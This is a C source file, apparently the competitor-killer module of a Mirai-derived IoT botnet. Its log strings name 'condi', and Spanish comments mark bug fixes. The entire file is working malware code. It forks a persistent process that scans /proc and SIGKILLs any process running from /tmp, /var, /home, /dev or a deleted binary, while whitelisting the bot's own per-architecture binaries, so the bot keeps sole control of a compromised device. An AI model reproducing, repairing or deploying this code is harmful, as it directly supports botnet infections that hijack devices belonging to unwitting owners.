#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = 0;
volatile int stop_flag = 0;

const char *whitelisted[] = {
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "var/run/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "telnet",
    "ssh",
    "watchdog",
    "sshd",
    "/usr/compress/bin/",
    "/compress/bin",
    "/compress/usr/",
    "bash",
    "main_x86",
    "main_x86_64",
    "main_mips",
    "main_mipsel",
    "main_arm",
    "main_arm5",
    "main_arm6",
    "main_arm7",
    "main_ppc",
    "main_m68k",
    "main_sh4",
    "main_spc",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/",
    "/usr/local/bin/apache2",
    "/lib/libc.so.6",
    "/tmp/.systemd",
};

const char *blacklisted[] = {
    "/tmp",
    "/var",
    "/mnt",
    "/boot",
    "/home",
    "/dev",
    "/.",
    "./",
    "/root",
    "(deleted)"
};

bool is_whitelisted(const char *path) {
    for (int i = 0; i < sizeof(whitelisted) / sizeof(whitelisted[0]); i++) {
        if (strstr(path, whitelisted[i]) != NULL) {
            return true;
        }
    }
    return false;
}

void killer_exe() {
    DIR *dir;
    struct dirent *entry;
    pid_t current_pid = getpid();

    dir = opendir("/proc/");
    if (dir == NULL) {
        perror("opendir");
        return;
    }

    while ((entry = readdir(dir))) {
        int pid = atoi(entry->d_name);
        if (pid <= 0 || pid == current_pid || pid == killer_pid || pid == getppid() || pid == 1)
            continue;

        char proc_path[BUFFER];
        char link_path[BUFFER];

        snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
        ssize_t len = readlink(proc_path, link_path, sizeof(link_path) - 1);
        if (len == -1) continue;

        link_path[len] = '\0';
        if (is_whitelisted(link_path))
            continue;

        // CORRECCIÓN: usar tamaño del array en lugar de NULL
        for (int i = 0; i < sizeof(blacklisted) / sizeof(blacklisted[0]); ++i) {
            if (strstr(link_path, blacklisted[i]) != NULL) {
                char message[256];
                snprintf(message, sizeof(message), "(condi/exe) Killed process: %s, PID: %d\n", link_path, pid);
                if (kill(pid, SIGKILL) == 0) {
                    #ifdef DEBUG
                        printf("%s", message);
                    #endif
                }
                continue;
            }
        }
    }
    closedir(dir);
}

void killer_maps() {
    DIR *dir;
    struct dirent *file;
    char maps_path[BUFFER];
    char maps_line[BUFFER];

    dir = opendir("/proc/");
    if (dir == NULL) return;

    while ((file = readdir(dir)) != NULL) {
        int pid = atoi(file->d_name);
        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        snprintf(maps_path, BUFFER, "/proc/%d/maps", pid);

        // CORRECCIÓN: usar maps_path, no maps_line
        FILE *maps_file = fopen(maps_path, "r");
        if (maps_file == NULL) continue;

        while (fgets(maps_line, sizeof(maps_line), maps_file) != NULL) {
            char *pos = strchr(maps_line, ' ');
            if (pos != NULL) *pos = '\0';

            if (is_whitelisted(maps_line)) continue;

            for (int i = 0; i < sizeof(blacklisted) / sizeof(blacklisted[0]); ++i) {
                if (strstr(maps_line, blacklisted[i]) != NULL) {
                    char message[256];
                    snprintf(message, sizeof(message), "(condi/maps) Killed Process: %s, PID: %d\n", maps_line, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf("%s", message);
                        #endif
                    }
                    continue;
                }
            }
        }
        fclose(maps_file);
    }
    closedir(dir);
}

void killer_kill(void) {
    stop_flag = 1;
}

void killer_init(void) {
    int child = fork();
    if (child > 0 || child == 1) return;

    prctl(PR_SET_PDEATHSIG, SIGHUP);
    while (1) {
        killer_exe();
        killer_maps();
        usleep(300000);
    }
}